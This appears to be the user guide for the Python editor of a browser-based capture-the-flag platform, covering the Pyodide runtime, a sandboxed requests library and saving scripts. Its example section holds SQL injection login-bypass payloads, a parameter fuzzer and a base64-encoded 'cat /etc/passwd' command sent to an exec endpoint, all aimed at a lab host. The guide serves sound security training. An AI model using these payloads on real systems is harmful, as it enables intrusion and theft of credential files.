# Python Scripting Tool

## Code Editor Interface

The Code Editor panel provides a complete Python 3 editing and execution environment, powered by **Pyodide** (CPython ported to WebAssembly), running entirely inside the browser.

Interface regions:

| Region | Description |
|---|---|
| Code editing area | Main area for typing Python scripts, with syntax highlighting and auto-indent |
| Execution output area | Shows `print()` output, error messages, and execution status |
| Toolbar | Holds the Run button, a Save button, and a "Load script…" dropdown listing your saved scripts |

> **Note**: The Run button doubles as the runtime status indicator. It reads "Loading…" and stays disabled until Pyodide finishes initializing, then becomes "▶ Run"; while a script is executing it reads "Running…".

## Available Modules

### Pyodide Standard Library

The following modules can be `import`ed directly with no installation required:

| Module | Description | Typical use |
|---|---|---|
| `json` | JSON parsing and serialization | Parse API responses, build JSON payloads |
| `re` | Regular expressions | Extract flags from responses, filter specific strings |
| `base64` | Base64 encoding and decoding | Decode tokens, encode payloads |
| `hashlib` | Hash functions (MD5, SHA-1, SHA-256, etc.) | Compute hashes, verify integrity |
| `urllib.parse` | URL encoding and parsing | Build query strings, URL encode/decode |
| `html` | HTML escape handling | Decode HTML entities |
| `itertools` | Iteration utilities | Brute-force combination enumeration |
| `string` | String constants | Obtain alphabet and digit character sets |

### requests (installed via micropip)

The platform installs the real `requests` library with micropip, then monkey-patches its transport layer (`HTTPAdapter.send`) so requests are routed to the challenge backend through the platform's dispatch bridge instead of the network. Because the library itself is genuine, the full API is available — `get`, `post`, `put`, `delete`, `Session`, cookie handling, auth helpers, and so on — and the requests it sends are recorded in the Network Traffic Log alongside traffic from the other panels.

The two calls you will reach for most often:

| Function | Description |
|---|---|
| `requests.get(url, params, headers, allow_redirects)` | Send a GET request |
| `requests.post(url, data, json, headers)` | Send a POST request |

The response object exposes the following attributes:

| Attribute | Type | Description |
|---|---|---|
| `.status_code` | `int` | HTTP status code |
| `.text` | `str` | Response body as a string |
| `.json()` | `dict` / `list` | Parse the response body as JSON |
| `.headers` | `dict` | Response headers |
| `.url` | `str` | The actual URL that was requested |

## Using requests

### GET Requests

```python
import requests

# Basic GET request
response = requests.get("http://target.local/api/user?id=1")
print(response.status_code)
print(response.text)

# GET request with query parameters
params = {"id": "1", "debug": "true"}
response = requests.get("http://target.local/api/user", params=params)
print(response.url)   # Shows the full URL (including query string)
print(response.text)

# GET request with custom headers
headers = {
    "Cookie": "session=abc123",
    "X-Forwarded-For": "127.0.0.1"
}
response = requests.get("http://target.local/admin", headers=headers)
print(response.status_code)
print(response.text)
```

### POST Requests

```python
import requests

# Form POST request (application/x-www-form-urlencoded)
data = {"username": "admin", "password": "password123"}
response = requests.post("http://target.local/login", data=data)
print(response.status_code)
print(response.text)

# JSON POST request (application/json)
payload = {"query": "SELECT * FROM users"}
response = requests.post("http://target.local/api/query", json=payload)
print(response.json())

# POST request with headers
headers = {"Content-Type": "application/json", "Authorization": "Bearer token123"}
response = requests.post(
    "http://target.local/api/admin",
    json={"action": "list_users"},
    headers=headers
)
print(response.text)
```

## Attack Script Examples

### SQL Injection Testing

The following example shows how to automate testing a login form for SQL Injection vulnerabilities:

```python
import requests

BASE_URL = "http://target.local/login"

# Common SQL Injection payloads
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "admin'--",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
]

for payload in payloads:
    data = {"username": payload, "password": "anything"}
    response = requests.post(BASE_URL, data=data)

    # Check whether the login succeeded
    if "Welcome" in response.text or "flag" in response.text.lower():
        print(f"[!] Payload succeeded: {payload}")
        print(f"    Response: {response.text[:200]}")
    else:
        print(f"[-] Failed: {payload}")
```

### Parameter Fuzzing

```python
import requests
import re

BASE_URL = "http://target.local/page"

# Fuzz the range of the id parameter
for i in range(1, 20):
    response = requests.get(BASE_URL, params={"id": i})

    # Search the response for a flag pattern
    match = re.search(r"flag\{[^}]+\}", response.text)
    if match:
        print(f"[!] Flag found! id={i}: {match.group()}")
        break
    else:
        print(f"    id={i}: {response.status_code} - {len(response.text)} bytes")
```

### Base64-encoded Payload

```python
import requests
import base64

BASE_URL = "http://target.local/exec"

# Build a Base64-encoded command
command = "cat /etc/passwd"
encoded = base64.b64encode(command.encode()).decode()

response = requests.get(BASE_URL, params={"cmd": encoded})
print(response.text)
```

## Keyboard Shortcuts

| Shortcut | Action |
|---|---|
| `Cmd + Enter` (macOS) / `Ctrl + Enter` (Windows/Linux) | Run the current script |

Standard CodeMirror editing and undo/redo bindings are also active. Saving is done from the toolbar rather than a shortcut.

## Saving and Loading Scripts

The Code Editor can save scripts to the browser's **IndexedDB**, which makes it easy to reuse common scripts across different challenges.

### Saving a Script

Click the "Save" button on the toolbar, then enter a script name and confirm to store it.

### Loading a Script

Open the "Load script…" dropdown on the toolbar and pick a script from the saved list; the editor contents are replaced with the selected script. The dropdown is disabled while no scripts are saved.

> **Note**: Script data is stored locally in the browser's IndexedDB and will be removed when site data is cleared. Back up important scripts to a local text editor.
